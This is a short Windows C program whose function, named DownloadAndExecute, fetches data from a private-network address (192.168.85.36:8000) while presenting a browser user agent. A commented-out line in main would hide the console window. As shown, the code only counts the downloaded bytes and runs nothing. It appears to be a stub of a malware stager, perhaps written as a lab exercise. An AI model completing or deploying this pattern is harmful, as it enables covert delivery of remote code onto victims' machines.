#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

void DownloadAndExecute() {
    HINTERNET hInternet = InternetOpenA(
        "Mozilla/5.0",
        INTERNET_OPEN_TYPE_PRECONFIG,
        NULL, NULL, 0);

    if (!hInternet) {
        printf("InternetOpen failed: %lu\n", GetLastError());
        return;
    }

    HINTERNET hFile = InternetOpenUrlA(
        hInternet,
        "http://192.168.85.36:8000/data",
        NULL, 0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
        0);

    if (!hFile) {
        printf("InternetOpenUrl failed: %lu\n", GetLastError());
        InternetCloseHandle(hInternet);
        return;
    }

    char buffer[4096];
    DWORD bytesRead = 0;
    DWORD totalSize = 0;

    while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        totalSize += bytesRead;
    }

    printf("Downloaded %lu bytes.\n", totalSize);

    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);
}

int main() {
    // ShowWindow(GetConsoleWindow(), SW_HIDE);
    DownloadAndExecute();

    printf("Press Enter to exit...\n");
    getchar();
    return 0;
}
